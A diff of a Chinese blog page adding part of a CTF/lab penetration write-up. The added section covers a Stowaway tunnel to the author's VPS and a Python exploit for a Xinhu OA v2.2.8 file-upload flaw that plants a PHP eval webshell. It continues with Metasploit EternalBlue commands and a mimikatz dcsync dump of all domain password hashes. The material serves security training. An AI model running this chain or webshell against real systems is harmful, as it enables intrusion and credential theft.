@@ -288,7 +288,28 @@
         <li><a href="#使用thinkphp工具一把梭sudo提权">使用thinkphp工具一把梭+sudo提权</a></li>
       </ol>
     </li>
-    <li><a href="#flag2和3内网打点">flag2和3：内网打点</a></li>
+    <li><a href="#flag2和3内网打点">flag2和3：内网打点</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#1使用stowaway搭建隧道">1.使用Stowaway搭建隧道</a></li>
+          </ol>
+        </li>
+        <li><a href="#2信呼协同办公系统v228文件上传漏洞">2.信呼协同办公系统v2.2.8文件上传漏洞</a>
+          <ol>
+            <li><a href="#蚁剑连接">蚁剑连接</a></li>
+            <li><a href="#windows服务器寻找flag2">windows服务器寻找flag2</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#ms17-010永恒之蓝漏洞">ms17-010（永恒之蓝漏洞）</a>
+      <ol>
+        <li></li>
+        <li><a href="#使用msfconsole打漏洞">使用msfconsole打漏洞</a></li>
+        <li><a href="#打域控">打域控</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -357,7 +378,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 2 分钟
+                    阅读时长: 3 分钟
                 </time>
             </div>
         
@@ -522,6 +543,245 @@
 </span></span><span class="line"><span class="cl">172.22.1.18:信呼OA办公系统
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h4 id="1使用stowaway搭建隧道">1.使用Stowaway搭建隧道
+</h4><p>Stowaway下载地址：https://github.com/ph4ntonn/Stowaway</p>
+<p>把<code>linux_x64_agent</code>上传到当前目录(如/tmp目录)，然后执行<code>chmod 777 ./linux_x64_agent</code></p>
+<img src="image-20250730210406308.png" alt="image-20250730210406308" style="zoom:50%;" />
+<p><img src="/p/2025-initial/image-20250730210454131.png"
+	width="490"
+	height="74"
+	srcset="/p/2025-initial/image-20250730210454131_hu_303b723e5d9407f0.png 480w, /p/2025-initial/image-20250730210454131_hu_13236f7d7949607.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250730210454131"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="662"
+		data-flex-basis="1589px"
+	
+></p>
+<p>把<code>linux_x64_admin</code>上传到自己的vps上，给执行权限后（<strong>chmod 777 ./linux_x64_admin</strong>）执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 12345 -s 123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>注1：vps的端口为12345，连接密钥是123456，均可自定义</strong></p>
+<p><strong>注2：vps的端口注意需要安全组放通</strong></p>
+<p>然后在这台已经getshell的机器上运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">./</span><span class="nx">linux_x64_agent</span> <span class="o">-</span><span class="nx">c</span> <span class="mf">101.200</span><span class="o">.</span><span class="mf">39.193</span><span class="o">:</span><span class="mi">12345</span> <span class="o">-</span><span class="nx">s</span> <span class="mi">123456</span> <span class="o">--</span><span class="nx">reconnect</span> <span class="mi">8</span>		<span class="c1">// 101.200.39.193是vps的ip
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250730211308241.png" alt="image-20250730211308241" style="zoom:50%;" />
+<p>成功搭建隧道，然后在vps上依次执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use 0
+</span></span><span class="line"><span class="cl">socks 5555  //端口可自定义
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-initial/image-20250730211715420.png"
+	width="415"
+	height="118"
+	srcset="/p/2025-initial/image-20250730211715420_hu_6853df13f582920c.png 480w, /p/2025-initial/image-20250730211715420_hu_5158e09623b9ec69.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250730211715420"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="351"
+		data-flex-basis="844px"
+	
+></p>
+<p>在FoxyProxy插件设置代理，将hostname和端口修改为自己设置的端口</p>
+<img src="image-20250730212346200.png" alt="image-20250730212346200" style="zoom:50%;" />
+<h3 id="2信呼协同办公系统v228文件上传漏洞">2.信呼协同办公系统v2.2.8文件上传漏洞
+</h3><p>访问网站，存在弱口令admin/admin123，但对于题目关系不大</p>
+<img src="image-20250730212818111.png" alt="image-20250730212818111" style="zoom:50%;" />
+<p>参考文字:<a class="link" href="https://www.yuque.com/infernity/penetration/zeu8x8vz8n7bxegw?singleDoc#fO42F"  target="_blank" rel="noopener"
+    >Initial</a></p>
+<p>exp一把梭哈</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;socks5://101.200.39.193:5555&#34;</span><span class="p">,</span>   <span class="c1">#根据之前搭建的隧道修改ip和端口</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url_pre</span> <span class="o">=</span> <span class="s1">&#39;http://172.22.1.18/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url1</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url2</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data1</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;rempass&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;jmpass&#39;</span><span class="p">:</span> <span class="s1">&#39;false&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;device&#39;</span><span class="p">:</span> <span class="s1">&#39;1625884034525&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ltype&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;adminuser&#39;</span><span class="p">:</span> <span class="s1">&#39;YWRtaW4=&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;adminpass&#39;</span><span class="p">:</span> <span class="s1">&#39;YWRtaW4xMjM=&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;yanzm&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;1.php&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;&lt;?php eval($_POST[&#39;Infernity&#39;]);&#34;</span><span class="p">)</span>   <span class="c1">#一句话木马内容</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data1</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url2</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.php&#39;</span><span class="p">,</span> <span class="s1">&#39;r+&#39;</span><span class="p">)},</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;1.php&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filepath</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;filepath&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">filepath</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">filepath</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.uptemp&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">id</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">url3</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url3</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_pre</span> <span class="o">+</span> <span class="n">filepath</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Infernity&#34;</span><span class="p">:</span><span class="s2">&#34;system(&#39;whoami&#39;);&#34;</span><span class="p">},</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接得到上传木马的路径：</p>
+<img src="image-20250730213524901.png" alt="image-20250730213524901" style="zoom:50%;" />
+<h4 id="蚁剑连接">蚁剑连接
+</h4><p>现在访问<code>http://172.22.1.18/upload/2025-07/30_21315244.php</code>即可rce，我们直接用蚁剑链接。同样的，先给蚁剑上好代理。</p>
+<p>将代理服务器和端口设置成之前搭建的vps的ip和端口</p>
+<img src="image-20250730213744038.png" alt="image-20250730213744038" style="zoom:50%;" />
+<img src="image-20250730214114364.png" alt="image-20250730214114364" style="zoom:50%;" />
+<h4 id="windows服务器寻找flag2">windows服务器寻找flag2
+</h4><p><em><em>在C盘的根目录下，输入dir flag</em> /s，找到flag2</em>*</p>
+<img src="image-20250730214544728.png" alt="image-20250730214544728" style="zoom:50%;" />
+<p><code>2ce3-4813-87d4-</code></p>
+<img src="image-20250730214351161.png" alt="image-20250730214351161" style="zoom:50%;" />
+<h2 id="ms17-010永恒之蓝漏洞">ms17-010（永恒之蓝漏洞）
+</h2><p>kali配置proxychains4：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`sudo vim /etc/proxychains4.conf`写入：`socks5 101.200.39.193 5555`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="">
+</h3><p><img src="/p/2025-initial/image-20250804180441110.png"
+	width="693"
+	height="237"
+	srcset="/p/2025-initial/image-20250804180441110_hu_bb2fc367fb3d521f.png 480w, /p/2025-initial/image-20250804180441110_hu_2dc14a7942ddad09.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250804180441110"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="292"
+		data-flex-basis="701px"
+	
+></p>
+<h3 id="使用msfconsole打漏洞">使用msfconsole打漏洞
+</h3><p>依次输入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">proxychains4</span> <span class="n">msfconsole</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms17_010_eternalblue</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp_uuid</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">RHOSTS</span> <span class="mf">172.22</span><span class="o">.</span><span class="mf">1.21</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250804181233247.png" alt="image-20250804181233247" style="zoom:50%;" />
+<img src="image-20250804181550791.png" alt="image-20250804181550791" style="zoom:50%;" />
+<p><img src="/p/2025-initial/image-20250804182405602.png"
+	width="868"
+	height="350"
+	srcset="/p/2025-initial/image-20250804182405602_hu_b52dd3f737895bf6.png 480w, /p/2025-initial/image-20250804182405602_hu_a41f8d6a8f74df81.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250804182405602"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<p>像这样就成功了，如果没成功，可能是网络波动，再执行一次exploit即可。</p>
+<h3 id="打域控">打域控
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="nb">load</span> <span class="n">kiwi</span>  <span class="c1"># 调用mimikatz模块</span>
+</span></span><span class="line"><span class="cl"><span class="n">kiwi_cmd</span> <span class="s2">&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span> <span class="n">exit</span>  <span class="c1"># 导出域内所有用户的信息(包括哈希值)</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div>
 </section>
 
@@ -577,12 +837,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-7%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
+    <a href="/p/2025-swpu-nssctf/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-7月每日一题</h2>
+            <h2 class="article-title">2025-swpu-nssctf</h2>
         </div>
     </a>
 </article>
@@ -590,12 +850,12 @@
             
                 
 <article class="">
-    <a href="/p/2025%E5%A4%8F%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF/">
+    <a href="/p/2025-8%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025夏季春秋杯</h2>
+            <h2 class="article-title">2025-8月每日一题</h2>
         </div>
     </a>
 </article>
@@ -603,12 +863,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_846-858/">
+    <a href="/p/2025-awd/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-ctfshow-java反序列化_846-858</h2>
+            <h2 class="article-title">2025-awd</h2>
         </div>
     </a>
 </article>
@@ -616,12 +876,12 @@
             
                 
 <article class="">
-    <a href="/p/ctfshow_java-279-300/">
+    <a href="/p/2025-nepctf/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">ctfshow_java-279-300</h2>
+            <h2 class="article-title">2025-Nepctf</h2>
         </div>
     </a>
 </article>
